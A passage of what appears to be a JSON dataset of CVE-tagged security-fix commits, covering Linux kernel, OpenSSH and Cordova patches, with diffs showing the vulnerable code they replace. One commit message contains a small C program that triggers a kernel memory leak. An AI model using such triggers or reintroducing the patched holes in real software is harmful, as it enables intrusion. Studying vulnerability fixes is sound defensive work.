MNT_LOCK_ATIME;\n+\n+\t\tif (mnt->mnt.mnt_flags & MNT_READONLY)\n+\t\t\tmnt->mnt.mnt_flags |= MNT_LOCK_READONLY;\n+\n+\t\tif (mnt->mnt.mnt_flags & MNT_NODEV)\n+\t\t\tmnt->mnt.mnt_flags |= MNT_LOCK_NODEV;\n+\n+\t\tif (mnt->mnt.mnt_flags & MNT_NOSUID)\n+\t\t\tmnt->mnt.mnt_flags |= MNT_LOCK_NOSUID;\n+\n+\t\tif (mnt->mnt.mnt_flags & MNT_NOEXEC)\n+\t\t\tmnt->mnt.mnt_flags |= MNT_LOCK_NOEXEC;\n+\t}\n \n \t\/* Don't allow unprivileged users to reveal what is under a mount *\/\n \tif ((flag & CL_UNPRIVILEGED) && list_empty(&old->mnt_expire))\n@@ -1931,6 +1944,23 @@ static int do_remount(struct path *path, int flags, int mnt_flags,\n \t    !(mnt_flags & MNT_READONLY)) {\n \t\treturn -EPERM;\n \t}\n+\tif ((mnt->mnt.mnt_flags & MNT_LOCK_NODEV) &&\n+\t    !(mnt_flags & MNT_NODEV)) {\n+\t\treturn -EPERM;\n+\t}\n+\tif ((mnt->mnt.mnt_flags & MNT_LOCK_NOSUID) &&\n+\t    !(mnt_flags & MNT_NOSUID)) {\n+\t\treturn -EPERM;\n+\t}\n+\tif ((mnt->mnt.mnt_flags & MNT_LOCK_NOEXEC) &&\n+\t    !(mnt_flags & MNT_NOEXEC)) {\n+\t\treturn -EPERM;\n+\t}\n+\tif ((mnt->mnt.mnt_flags & MNT_LOCK_ATIME) &&\n+\t    ((mnt->mnt.mnt_flags & MNT_ATIME_MASK) != (mnt_flags & MNT_ATIME_MASK))) {\n+\t\treturn -EPERM;\n+\t}\n+\n \terr = security_sb_remount(sb, data);\n \tif (err)\n \t\treturn err;\n@@ -2129,7 +2159,7 @@ static int do_new_mount(struct path *path, const char *fstype, int flags,\n \t\t *\/\n \t\tif (!(type->fs_flags & FS_USERNS_DEV_MOUNT)) {\n \t\t\tflags |= MS_NODEV;\n-\t\t\tmnt_flags |= MNT_NODEV;\n+\t\t\tmnt_flags |= MNT_NODEV | MNT_LOCK_NODEV;\n \t\t}\n \t}\n \ndiff --git a\/include\/linux\/mount.h b\/include\/linux\/mount.h\nindex b637a89e1fae..b0c1e6574e7f 100644\n--- a\/include\/linux\/mount.h\n+++ b\/include\/linux\/mount.h\n@@ -45,12 +45,17 @@ struct mnt_namespace;\n #define MNT_USER_SETTABLE_MASK  (MNT_NOSUID | MNT_NODEV | MNT_NOEXEC \\\n \t\t\t\t | MNT_NOATIME | MNT_NODIRATIME | MNT_RELATIME \\\n \t\t\t\t | MNT_READONLY)\n+#define MNT_ATIME_MASK (MNT_NOATIME | MNT_NODIRATIME | MNT_RELATIME )\n \n #define MNT_INTERNAL_FLAGS (MNT_SHARED | MNT_WRITE_HOLD | MNT_INTERNAL | \\\n \t\t\t    MNT_DOOMED | MNT_SYNC_UMOUNT | MNT_MARKED)\n \n #define MNT_INTERNAL\t0x4000\n \n+#define MNT_LOCK_ATIME\t\t0x040000\n+#define MNT_LOCK_NOEXEC\t\t0x080000\n+#define MNT_LOCK_NOSUID\t\t0x100000\n+#define MNT_LOCK_NODEV\t\t0x200000\n #define MNT_LOCK_READONLY\t0x400000\n #define MNT_LOCKED\t\t0x800000\n #define MNT_DOOMED\t\t0x1000000\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-0291","CWE_ID":"264","category":"security","commit_id":"570dcf2c15463842e384eb597a87c1e39bead99b","commit_message":"From 570dcf2c15463842e384eb597a87c1e39bead99b Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Mon, 30 Nov 2009 16:52:36 -0500\nSubject: Kill ancient crap in s390 compat mmap\n\nWe've had TASK_SIZE set to 1<<31 for 31bit tasks since May 2004.\nBefore that old32_mmap() had to deal with do_mmap_pgoff() giving\nit an address out of range.  It had tried to do that by checking\nreturn value and doing do_munmap() (at wrong address, BTW).\n\nIOW, that code had been dead for 5.5 years (and bogus - for 8).\nKill.\n\nAcked-by: Hugh Dickins <hugh.dickins@tiscali.co.uk>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n arch\/s390\/kernel\/compat_linux.c | 5 -----\n 1 file changed, 5 deletions(-)\n\n","diff_code":"diff --git a\/arch\/s390\/kernel\/compat_linux.c b\/arch\/s390\/kernel\/compat_linux.c\nindex 25c31d681402..11556aa6bf17 100644\n--- a\/arch\/s390\/kernel\/compat_linux.c\n+++ b\/arch\/s390\/kernel\/compat_linux.c\n@@ -642,11 +642,6 @@ static inline long do_mmap2(\n \n \tdown_write(&current->mm->mmap_sem);\n \terror = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n-\tif (!IS_ERR((void *) error) && error + len >= 0x80000000ULL) {\n-\t\t\/* Result is out of bounds.  *\/\n-\t\tdo_munmap(current->mm, addr, len);\n-\t\terror = -ENOMEM;\n-\t}\n \tup_write(&current->mm->mmap_sem);\n \n \tif (file)\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2015-1593","CWE_ID":"264","category":"security","commit_id":"4e7c22d447bb6d7e37bfe39ff658486ae78e8d77","commit_message":"From 4e7c22d447bb6d7e37bfe39ff658486ae78e8d77 Mon Sep 17 00:00:00 2001\nFrom: Hector Marco-Gisbert <hecmargi@upv.es>\nDate: Sat, 14 Feb 2015 09:33:50 -0800\nSubject: x86, mm\/ASLR: Fix stack randomization on 64-bit systems\n\nThe issue is that the stack for processes is not properly randomized on\n64 bit architectures due to an integer overflow.\n\nThe affected function is randomize_stack_top() in file\n\"fs\/binfmt_elf.c\":\n\n  static unsigned long randomize_stack_top(unsigned long stack_top)\n  {\n           unsigned int random_variable = 0;\n\n           if ((current->flags & PF_RANDOMIZE) &&\n                   !(current->personality & ADDR_NO_RANDOMIZE)) {\n                   random_variable = get_random_int() & STACK_RND_MASK;\n                   random_variable <<= PAGE_SHIFT;\n           }\n           return PAGE_ALIGN(stack_top) + random_variable;\n           return PAGE_ALIGN(stack_top) - random_variable;\n  }\n\nNote that, it declares the \"random_variable\" variable as \"unsigned int\".\nSince the result of the shifting operation between STACK_RND_MASK (which\nis 0x3fffff on x86_64, 22 bits) and PAGE_SHIFT (which is 12 on x86_64):\n\n\t  random_variable <<= PAGE_SHIFT;\n\nthen the two leftmost bits are dropped when storing the result in the\n\"random_variable\". This variable shall be at least 34 bits long to hold\nthe (22+12) result.\n\nThese two dropped bits have an impact on the entropy of process stack.\nConcretely, the total stack entropy is reduced by four: from 2^28 to\n2^30 (One fourth of expected entropy).\n\nThis patch restores back the entropy by correcting the types involved\nin the operations in the functions randomize_stack_top() and\nstack_maxrandom_size().\n\nThe successful fix can be tested with:\n\n  $ for i in `seq 1 10`; do cat \/proc\/self\/maps | grep stack; done\n  7ffeda566000-7ffeda587000 rw-p 00000000 00:00 0                          [stack]\n  7fff5a332000-7fff5a353000 rw-p 00000000 00:00 0                          [stack]\n  7ffcdb7a1000-7ffcdb7c2000 rw-p 00000000 00:00 0                          [stack]\n  7ffd5e2c4000-7ffd5e2e5000 rw-p 00000000 00:00 0                          [stack]\n  ...\n\nOnce corrected, the leading bytes should be between 7ffc and 7fff,\nrather than always being 7fff.\n\nSigned-off-by: Hector Marco-Gisbert <hecmargi@upv.es>\nSigned-off-by: Ismael Ripoll <iripoll@upv.es>\n[ Rebased, fixed 80 char bugs, cleaned up commit message, added test example and CVE ]\nSigned-off-by: Kees Cook <keescook@chromium.org>\nCc: <stable@vger.kernel.org>\nCc: Linus Torvalds <torvalds@linux-foundation.org>\nCc: Andrew Morton <akpm@linux-foundation.org>\nCc: Al Viro <viro@zeniv.linux.org.uk>\nFixes: CVE-2015-1593\nLink: http:\/\/lkml.kernel.org\/r\/20150214173350.GA18393@www.outflux.net\nSigned-off-by: Borislav Petkov <bp@suse.de>\n---\n arch\/x86\/mm\/mmap.c | 6 +++---\n fs\/binfmt_elf.c    | 5 +++--\n 2 files changed, 6 insertions(+), 5 deletions(-)\n\n","diff_code":"diff --git a\/arch\/x86\/mm\/mmap.c b\/arch\/x86\/mm\/mmap.c\nindex 919b91205cd4..df4552bd239e 100644\n--- a\/arch\/x86\/mm\/mmap.c\n+++ b\/arch\/x86\/mm\/mmap.c\n@@ -35,12 +35,12 @@ struct va_alignment __read_mostly va_align = {\n \t.flags = -1,\n };\n \n-static unsigned int stack_maxrandom_size(void)\n+static unsigned long stack_maxrandom_size(void)\n {\n-\tunsigned int max = 0;\n+\tunsigned long max = 0;\n \tif ((current->flags & PF_RANDOMIZE) &&\n \t\t!(current->personality & ADDR_NO_RANDOMIZE)) {\n-\t\tmax = ((-1U) & STACK_RND_MASK) << PAGE_SHIFT;\n+\t\tmax = ((-1UL) & STACK_RND_MASK) << PAGE_SHIFT;\n \t}\n \n \treturn max;\ndiff --git a\/fs\/binfmt_elf.c b\/fs\/binfmt_elf.c\nindex 02b16910f4c9..995986b8e36b 100644\n--- a\/fs\/binfmt_elf.c\n+++ b\/fs\/binfmt_elf.c\n@@ -645,11 +645,12 @@ out:\n \n static unsigned long randomize_stack_top(unsigned long stack_top)\n {\n-\tunsigned int random_variable = 0;\n+\tunsigned long random_variable = 0;\n \n \tif ((current->flags & PF_RANDOMIZE) &&\n \t\t!(current->personality & ADDR_NO_RANDOMIZE)) {\n-\t\trandom_variable = get_random_int() & STACK_RND_MASK;\n+\t\trandom_variable = (unsigned long) get_random_int();\n+\t\trandom_variable &= STACK_RND_MASK;\n \t\trandom_variable <<= PAGE_SHIFT;\n \t}\n #ifdef CONFIG_STACK_GROWSUP\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-0073","CWE_ID":"264","category":"security","commit_id":"26702cb0720c5c394b407c23570136c53171fa55","commit_message":"From 26702cb0720c5c394b407c23570136c53171fa55 Mon Sep 17 00:00:00 2001\nFrom: Ian Clelland <iclelland@chromium.org>\nDate: Wed, 19 Feb 2014 00:26:19 -0500\nSubject: [PATCH] Validate that callbackId is correctly formed\n\n---\n src\/ios\/CDVInAppBrowser.h |  1 +\n src\/ios\/CDVInAppBrowser.m | 20 +++++++++++++++++++-\n 2 files changed, 20 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/src\/ios\/CDVInAppBrowser.h b\/src\/ios\/CDVInAppBrowser.h\nindex 581bcd030..8e2ab1258 100644\n--- a\/src\/ios\/CDVInAppBrowser.h\n+++ b\/src\/ios\/CDVInAppBrowser.h\n@@ -30,6 +30,7 @@\n \n @property (nonatomic, retain) CDVInAppBrowserViewController* inAppBrowserViewController;\n @property (nonatomic, copy) NSString* callbackId;\n+@property (nonatomic, copy) NSRegularExpression *callbackIdPattern;\n \n - (void)open:(CDVInvokedUrlCommand*)command;\n - (void)close:(CDVInvokedUrlCommand*)command;\ndiff --git a\/src\/ios\/CDVInAppBrowser.m b\/src\/ios\/CDVInAppBrowser.m\nindex 213cb7364..88b737cb1 100644\n--- a\/src\/ios\/CDVInAppBrowser.m\n+++ b\/src\/ios\/CDVInAppBrowser.m\n@@ -47,6 +47,7 @@ - (CDVInAppBrowser*)initWithWebView:(UIWebView*)theWebView\n     self = [super initWithWebView:theWebView];\n     if (self != nil) {\n         _previousStatusBarStyle = -1;\n+        _callbackIdPattern = nil;\n     }\n \n     return self;\n@@ -297,6 +298,23 @@ - (void)injectStyleFile:(CDVInvokedUrlCommand*)command\n     [self injectDeferredObject:[command argumentAtIndex:0] withWrapper:jsWrapper];\n }\n \n+- (BOOL)isValidCallbackId:(NSString *)callbackId\n+{\n+    NSError *err = nil;\n+    \/\/ Initialize on first use\n+    if (self.callbackIdPattern == nil) {\n+        self.callbackIdPattern = [NSRegularExpression regularExpressionWithPattern:@\"^InAppBrowser[0-9]{1,10}$\" options:0 error:&err];\n+        if (err != nil) {\n+            \/\/ Couldn't initialize Regex; No is safer than Yes.\n+            return NO;\n+        }\n+    }\n+    if ([self.callbackIdPattern firstMatchInString:callbackId options:0 range:NSMakeRange(0, [callbackId length])]) {\n+        return YES;\n+    }\n+    return NO;\n+}\n+\n \/**\n  * The iframe bridge provided for the InAppBrowser is capable of executing any oustanding callback belonging\n  * to the InAppBrowser plugin. Care has been taken that other callbacks cannot be triggered, and that no\n@@ -323,7 +341,7 @@ - (BOOL)webView:(UIWebView*)theWebView shouldStartLoadWithRequest:(NSURLRequest*\n         NSString* scriptCallbackId = [url host];\n         CDVPluginResult* pluginResult = nil;\n \n-        if ([scriptCallbackId hasPrefix:@\"InAppBrowser\"]) {\n+        if ([self isValidCallbackId:scriptCallbackId]) {\n             NSString* scriptResult = [url path];\n             NSError* __autoreleasing error = nil;\n \n","owner":"apache","repo":"cordova-plugin-inappbrowser","source":"cve"},{"CVE_ID":"CVE-2010-3850","CWE_ID":"264","category":"security","commit_id":"16c41745c7b92a243d0874f534c1655196c64b74","commit_message":"From 16c41745c7b92a243d0874f534c1655196c64b74 Mon Sep 17 00:00:00 2001\nFrom: Phil Blundell <philb@gnu.org>\nDate: Wed, 24 Nov 2010 11:49:53 -0800\nSubject: econet: fix CVE-2010-3850\n\nAdd missing check for capable(CAP_NET_ADMIN) in SIOCSIFADDR operation.\n\nSigned-off-by: Phil Blundell <philb@gnu.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/econet\/af_econet.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n","diff_code":"diff --git a\/net\/econet\/af_econet.c b\/net\/econet\/af_econet.c\nindex e366f1bef91f..d41ba8e56c10 100644\n--- a\/net\/econet\/af_econet.c\n+++ b\/net\/econet\/af_econet.c\n@@ -661,6 +661,9 @@ static int ec_dev_ioctl(struct socket *sock, unsigned int cmd, void __user *arg)\n \terr = 0;\n \tswitch (cmd) {\n \tcase SIOCSIFADDR:\n+\t\tif (!capable(CAP_NET_ADMIN))\n+\t\t\treturn -EPERM;\n+\n \t\tedev = dev->ec_ptr;\n \t\tif (edev == NULL) {\n \t\t\t\/* Magic up a new one. *\/\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2016-10010","CWE_ID":"264","category":"security","commit_id":"c76fac666ea038753294f2ac94d310f8adece9ce","commit_message":"From c76fac666ea038753294f2ac94d310f8adece9ce Mon Sep 17 00:00:00 2001\nFrom: djm <djm@openbsd.org>\nDate: Wed, 14 Dec 2016 00:36:34 +0000\nSubject: [PATCH] disable Unix-domain socket forwarding when privsep is\n disabled\n\n---\n usr.bin\/ssh\/serverloop.c | 8 +++++---\n 1 file changed, 5 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/usr.bin\/ssh\/serverloop.c b\/usr.bin\/ssh\/serverloop.c\nindex 679ad13c044..3c413e5bb10 100644\n--- a\/usr.bin\/ssh\/serverloop.c\n+++ b\/usr.bin\/ssh\/serverloop.c\n@@ -1,4 +1,4 @@\n-\/* $OpenBSD: serverloop.c,v 1.188 2016\/11\/30 03:00:05 djm Exp $ *\/\n+\/* $OpenBSD: serverloop.c,v 1.189 2016\/12\/14 00:36:34 djm Exp $ *\/\n \/*\n  * Author: Tatu Ylonen <ylo@cs.hut.fi>\n  * Copyright (c) 1995 Tatu Ylonen <ylo@cs.hut.fi>, Espoo, Finland\n@@ -472,7 +472,8 @@ server_request_direct_streamlocal(void)\n \n \t\/* XXX fine grained permissions *\/\n \tif ((options.allow_streamlocal_forwarding & FORWARD_LOCAL) != 0 &&\n-\t    !no_port_forwarding_flag && !options.disable_forwarding) {\n+\t    !no_port_forwarding_flag && !options.disable_forwarding &&\n+\t    use_privsep) {\n \t\tc = channel_connect_to_path(target,\n \t\t    \"direct-streamlocal@openssh.com\", \"direct-streamlocal\");\n \t} else {\n@@ -748,7 +749,8 @@ server_input_global_request(int type, u_int32_t seq, void *ctxt)\n \n \t\t\/* check permissions *\/\n \t\tif ((options.allow_streamlocal_forwarding & FORWARD_REMOTE) == 0\n-\t\t    || no_port_forwarding_flag || options.disable_forwarding) {\n+\t\t    || no_port_forwarding_flag || options.disable_forwarding ||\n+\t\t    !use_privsep) {\n \t\t\tsuccess = 0;\n \t\t\tpacket_send_debug(\"Server has disabled port forwarding.\");\n \t\t} else {\n","owner":"openbsd","repo":"src","source":"cve"},{"CVE_ID":"CVE-2013-0268","CWE_ID":"264","category":"security","commit_id":"c903f0456bc69176912dee6dd25c6a66ee1aed00","commit_message":"From c903f0456bc69176912dee6dd25c6a66ee1aed00 Mon Sep 17 00:00:00 2001\nFrom: Alan Cox <alan@linux.intel.com>\nDate: Thu, 15 Nov 2012 13:06:22 +0000\nSubject: [PATCH] x86\/msr: Add capabilities check\n\nAt the moment the MSR driver only relies upon file system\nchecks. This means that anything as root with any capability set\ncan write to MSRs. Historically that wasn't very interesting but\non modern processors the MSRs are such that writing to them\nprovides several ways to execute arbitary code in kernel space.\nSample code and documentation on doing this is circulating and\nMSR attacks are used on Windows 64bit rootkits already.\n\nIn the Linux case you still need to be able to open the device\nfile so the impact is fairly limited and reduces the security of\nsome capability and security model based systems down towards\nthat of a generic \"root owns the box\" setup.\n\nTherefore they should require CAP_SYS_RAWIO to prevent an\nelevation of capabilities. The impact of this is fairly minimal\non most setups because they don't have heavy use of\ncapabilities. Those using SELinux, SMACK or AppArmor rules might\nwant to consider if their rulesets on the MSR driver could be\ntighter.\n\nSigned-off-by: Alan Cox <alan@linux.intel.com>\nCc: Linus Torvalds <torvalds@linux-foundation.org>\nCc: Andrew Morton <akpm@linux-foundation.org>\nCc: Peter Zijlstra <a.p.zijlstra@chello.nl>\nCc: Horses <stable@kernel.org>\nSigned-off-by: Ingo Molnar <mingo@kernel.org>\n---\n arch\/x86\/kernel\/msr.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n","diff_code":"diff --git a\/arch\/x86\/kernel\/msr.c b\/arch\/x86\/kernel\/msr.c\nindex a7c5661f84962..4929502c1372d 100644\n--- a\/arch\/x86\/kernel\/msr.c\n+++ b\/arch\/x86\/kernel\/msr.c\n@@ -174,6 +174,9 @@ static int msr_open(struct inode *inode, struct file *file)\n \tunsigned int cpu;\n \tstruct cpuinfo_x86 *c;\n \n+\tif (!capable(CAP_SYS_RAWIO))\n+\t\treturn -EPERM;\n+\n \tcpu = iminor(file->f_path.dentry->d_inode);\n \tif (cpu >= nr_cpu_ids || !cpu_online(cpu))\n \t\treturn -ENXIO;\t\/* No such CPU *\/\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2009-0676","CWE_ID":"264","category":"security","commit_id":"df0bca049d01c0ee94afb7cd5dfd959541e6c8da","commit_message":"From df0bca049d01c0ee94afb7cd5dfd959541e6c8da Mon Sep 17 00:00:00 2001\nFrom: =?UTF-8?q?Cl=C3=A9ment=20Lecigne?= <clement.lecigne@netasq.com>\nDate: Thu, 12 Feb 2009 16:59:09 -0800\nSubject: net: 4 bytes kernel memory disclosure in SO_BSDCOMPAT gsopt try #2\nMIME-Version: 1.0\nContent-Type: text\/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\n\nIn function sock_getsockopt() located in net\/core\/sock.c, optval v.val\nis not correctly initialized and directly returned in userland in case\nwe have SO_BSDCOMPAT option set.\n\nThis dummy code should trigger the bug:\n\nint main(void)\n{\n\tunsigned char buf[4] = { 0, 0, 0, 0 };\n\tint len;\n\tint sock;\n\tsock = socket(33, 2, 2);\n\tgetsockopt(sock, 1, SO_BSDCOMPAT, &buf, &len);\n\tprintf(\"%x%x%x%x\\n\", buf[0], buf[1], buf[2], buf[3]);\n\tclose(sock);\n}\n\nHere is a patch that fix this bug by initalizing v.val just after its\ndeclaration.\n\nSigned-off-by: Cl\u00e9ment Lecigne <clement.lecigne@netasq.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/core\/sock.c | 2 ++\n 1 file changed, 2 insertions(+)\n\n","diff_code":"diff --git a\/net\/core\/sock.c b\/net\/core\/sock.c\nindex f3a0d08cbb48..6f2e1337975d 100644\n--- a\/net\/core\/sock.c\n+++ b\/net\/core\/sock.c\n@@ -696,6 +696,8 @@ int sock_getsockopt(struct socket *sock, int level, int optname,\n \tif (len < 0)\n \t\treturn -EINVAL;\n \n+\tv.val = 0;\n+\n \tswitch(optname) {\n \tcase SO_DEBUG:\n \t\tv.val = sock_flag(sk, SOCK_DBG);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-3646","CWE_ID":"264","category":"security","commit_id":"a642fc305053cc1c6e47e4f4df327895747ab485","commit_message":"From a642fc305053cc1c6e47e4f4df327895747ab485 Mon Sep 17 00:00:00 2001\nFrom: Petr Matousek <pmatouse@redhat.com>\nDate: Tue, 23 Sep 2014 20:22:30 +0200\nSubject: [PATCH] kvm: vmx: handle invvpid vm exit gracefully\n\nOn systems with invvpid instruction support (corresponding bit in\nIA32_VMX_EPT_VPID_CAP MSR is set) guest invocation of invvpid\ncauses vm exit, which is currently not handled and results in\npropagation of unknown exit to userspace.\n\nFix this by installing an invvpid vm exit handler.\n\nThis is CVE-2014-3646.\n\nCc: stable@vger.kernel.org\nSigned-off-by: Petr Matousek <pmatouse@redhat.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>\n---\n arch\/x86\/include\/uapi\/asm\/vmx.h | 2 ++\n arch\/x86\/kvm\/vmx.c              | 9 ++++++++-\n 2 files changed, 10 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/arch\/x86\/include\/uapi\/asm\/vmx.h b\/arch\/x86\/include\/uapi\/asm\/vmx.h\nindex 0e79420376eb9..990a2fe1588d5 100644\n--- a\/arch\/x86\/include\/uapi\/asm\/vmx.h\n+++ b\/arch\/x86\/include\/uapi\/asm\/vmx.h\n@@ -67,6 +67,7 @@\n #define EXIT_REASON_EPT_MISCONFIG       49\n #define EXIT_REASON_INVEPT              50\n #define EXIT_REASON_PREEMPTION_TIMER    52\n+#define EXIT_REASON_INVVPID             53\n #define EXIT_REASON_WBINVD              54\n #define EXIT_REASON_XSETBV              55\n #define EXIT_REASON_APIC_WRITE          56\n@@ -114,6 +115,7 @@\n \t{ EXIT_REASON_EOI_INDUCED,           \"EOI_INDUCED\" }, \\\n \t{ EXIT_REASON_INVALID_STATE,         \"INVALID_STATE\" }, \\\n \t{ EXIT_REASON_INVD,                  \"INVD\" }, \\\n+\t{ EXIT_REASON_INVVPID,               \"INVVPID\" }, \\\n \t{ EXIT_REASON_INVPCID,               \"INVPCID\" }\n \n #endif \/* _UAPIVMX_H *\/\ndiff --git a\/arch\/x86\/kvm\/vmx.c b\/arch\/x86\/kvm\/vmx.c\nindex 7e2c098b59c9a..cf3cd079ec523 100644\n--- a\/arch\/x86\/kvm\/vmx.c\n+++ b\/arch\/x86\/kvm\/vmx.c\n@@ -6746,6 +6746,12 @@ static int handle_invept(struct kvm_vcpu *vcpu)\n \treturn 1;\n }\n \n+static int handle_invvpid(struct kvm_vcpu *vcpu)\n+{\n+\tkvm_queue_exception(vcpu, UD_VECTOR);\n+\treturn 1;\n+}\n+\n \/*\n  * The exit handlers return 1 if the exit was handled fully and guest execution\n  * may resume.  Otherwise they set the kvm_run parameter to indicate what needs\n@@ -6791,6 +6797,7 @@ static int (*const kvm_vmx_exit_handlers[])(struct kvm_vcpu *vcpu) = {\n \t[EXIT_REASON_MWAIT_INSTRUCTION]\t      = handle_mwait,\n \t[EXIT_REASON_MONITOR_INSTRUCTION]     = handle_monitor,\n \t[EXIT_REASON_INVEPT]                  = handle_invept,\n+\t[EXIT_REASON_INVVPID]                 = handle_invvpid,\n };\n \n static const int kvm_vmx_max_exit_handlers =\n@@ -7026,7 +7033,7 @@ static bool nested_vmx_exit_handled(struct kvm_vcpu *vcpu)\n \tcase EXIT_REASON_VMPTRST: case EXIT_REASON_VMREAD:\n \tcase EXIT_REASON_VMRESUME: case EXIT_REASON_VMWRITE:\n \tcase EXIT_REASON_VMOFF: case EXIT_REASON_VMON:\n-\tcase EXIT_REASON_INVEPT:\n+\tcase EXIT_REASON_INVEPT: case EXIT_REASON_INVVPID:\n \t\t\/*\n \t\t * VMX instructions trap unconditionally. This allows L1 to\n \t\t * emulate them for its L2 guest, i.e., allows 3-level nesting!\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-3647","CWE_ID":"264","category":"security","commit_id":"d1442d85cc30ea75f7d399474ca738e0bc96f715","commit_message":"From d1442d85cc30ea75f7d399474ca738e0bc96f715 Mon Sep 17 00:00:00 2001\nFrom: Nadav Amit <namit@cs.technion.ac.il>\nDate: Thu, 18 Sep 2014 22:39:39 +0300\nSubject: KVM: x86: Handle errors when RIP is set during far jumps\n\nFar jmp\/call\/ret may fault while loading a new RIP.  Currently KVM does not\nhandle this case, and may result in failed vm-entry once the assignment is\ndone.  The tricky part of doing so is that loading the new CS affects the\nVMCS\/VMCB state, so if we fail during loading the new RIP, we are left in\nunconsistent state.  Therefore, this patch saves on 64-bit the old CS\ndescriptor and restores it if loading RIP failed.\n\nThis fixes CVE-2014-3647.\n\nCc: stable@vger.kernel.org\nSigned-off-by: Nadav Amit <namit@cs.technion.ac.il>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>\n---\n arch\/x86\/kvm\/emulate.c | 118 ++++++++++++++++++++++++++++++++++++-------------\n 1 file changed, 88 insertions(+), 30 deletions(-)\n\n","diff_code":"diff --git a\/arch\/x86\/kvm\/emulate.c b\/arch\/x86\/kvm\/emulate.c\nindex a1b9139169f6..c0deaff8d9f0 100644\n--- a\/arch\/x86\/kvm\/emulate.c\n+++ b\/arch\/x86\/kvm\/emulate.c\n@@ -1443,7 +1443,9 @@ static int write_segment_descriptor(struct x86_emulate_ctxt *ctxt,\n \n \/* Does not support long mode *\/\n static int __load_segment_descriptor(struct x86_emulate_ctxt *ctxt,\n-\t\t\t\t     u16 selector, int seg, u8 cpl, bool in_task_switch)\n+\t\t\t\t     u16 selector, int seg, u8 cpl,\n+\t\t\t\t     bool in_task_switch,\n+\t\t\t\t     struct desc_struct *desc)\n {\n \tstruct desc_struct seg_desc, old_desc;\n \tu8 dpl, rpl;\n@@ -1584,6 +1586,8 @@ static int __load_segment_descriptor(struct x86_emulate_ctxt *ctxt,\n \t}\n load:\n \tctxt->ops->set_segment(ctxt, selector, &seg_desc, base3, seg);\n+\tif (desc)\n+\t\t*desc = seg_desc;\n \treturn X86EMUL_CONTINUE;\n exception:\n \treturn emulate_exception(ctxt, err_vec, err_code, true);\n@@ -1593,7 +1597,7 @@ static int load_segment_descriptor(struct x86_emulate_ctxt *ctxt,\n \t\t\t\t   u16 selector, int seg)\n {\n \tu8 cpl = ctxt->ops->cpl(ctxt);\n-\treturn __load_segment_descriptor(ctxt, selector, seg, cpl, false);\n+\treturn __load_segment_descriptor(ctxt, selector, seg, cpl, false, NULL);\n }\n \n static void write_register_operand(struct operand *op)\n@@ -1987,17 +1991,31 @@ static int em_iret(struct x86_emulate_ctxt *ctxt)\n static int em_jmp_far(struct x86_emulate_ctxt *ctxt)\n {\n \tint rc;\n-\tunsigned short sel;\n+\tunsigned short sel, old_sel;\n+\tstruct desc_struct old_desc, new_desc;\n+\tconst struct x86_emulate_ops *ops = ctxt->ops;\n+\tu8 cpl = ctxt->ops->cpl(ctxt);\n+\n+\t\/* Assignment of RIP may only fail in 64-bit mode *\/\n+\tif (ctxt->mode == X86EMUL_MODE_PROT64)\n+\t\tops->get_segment(ctxt, &old_sel, &old_desc, NULL,\n+\t\t\t\t VCPU_SREG_CS);\n \n \tmemcpy(&sel, ctxt->src.valptr + ctxt->op_bytes, 2);\n \n-\trc = load_segment_descriptor(ctxt, sel, VCPU_SREG_CS);\n+\trc = __load_segment_descriptor(ctxt, sel, VCPU_SREG_CS, cpl, false,\n+\t\t\t\t       &new_desc);\n \tif (rc != X86EMUL_CONTINUE)\n \t\treturn rc;\n \n-\tctxt->_eip = 0;\n-\tmemcpy(&ctxt->_eip, ctxt->src.valptr, ctxt->op_bytes);\n-\treturn X86EMUL_CONTINUE;\n+\trc = assign_eip_far(ctxt, ctxt->src.val, new_desc.l);\n+\tif (rc != X86EMUL_CONTINUE) {\n+\t\tWARN_ON(!ctxt->mode != X86EMUL_MODE_PROT64);\n+\t\t\/* assigning eip failed; restore the old cs *\/\n+\t\tops->set_segment(ctxt, old_sel, &old_desc, 0, VCPU_SREG_CS);\n+\t\treturn rc;\n+\t}\n+\treturn rc;\n }\n \n static int em_grp45(struct x86_emulate_ctxt *ctxt)\n@@ -2064,21 +2082,34 @@ static int em_ret(struct x86_emulate_ctxt *ctxt)\n static int em_ret_far(struct x86_emulate_ctxt *ctxt)\n {\n \tint rc;\n-\tunsigned long cs;\n+\tunsigned long eip, cs;\n+\tu16 old_cs;\n \tint cpl = ctxt->ops->cpl(ctxt);\n+\tstruct desc_struct old_desc, new_desc;\n+\tconst struct x86_emulate_ops *ops = ctxt->ops;\n+\n+\tif (ctxt->mode == X86EMUL_MODE_PROT64)\n+\t\tops->get_segment(ctxt, &old_cs, &old_desc, NULL,\n+\t\t\t\t VCPU_SREG_CS);\n \n-\trc = emulate_pop(ctxt, &ctxt->_eip, ctxt->op_bytes);\n+\trc = emulate_pop(ctxt, &eip, ctxt->op_bytes);\n \tif (rc != X86EMUL_CONTINUE)\n \t\treturn rc;\n-\tif (ctxt->op_bytes == 4)\n-\t\tctxt->_eip = (u32)ctxt->_eip;\n \trc = emulate_pop(ctxt, &cs, ctxt->op_bytes);\n \tif (rc != 